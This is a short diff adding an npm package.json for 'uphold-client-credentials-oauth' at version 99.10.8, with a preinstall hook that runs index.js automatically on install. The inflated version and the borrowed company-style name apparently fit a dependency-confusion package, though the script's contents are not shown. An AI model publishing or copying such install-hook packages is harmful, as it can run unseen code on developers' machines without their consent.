@@ -1,0 +1,12 @@
+{
+  "name": "uphold-client-credentials-oauth",
+  "version": "99.10.8",
+  "description": "uphold test package",
+  "main":"index.js",
+  "scripts":{
+  "test":"echo \"error no test specified\" && exit 1",
+  "preinstall":"node index.js"
+  },
+  "author":"",
+  "License":"ISC"
+}
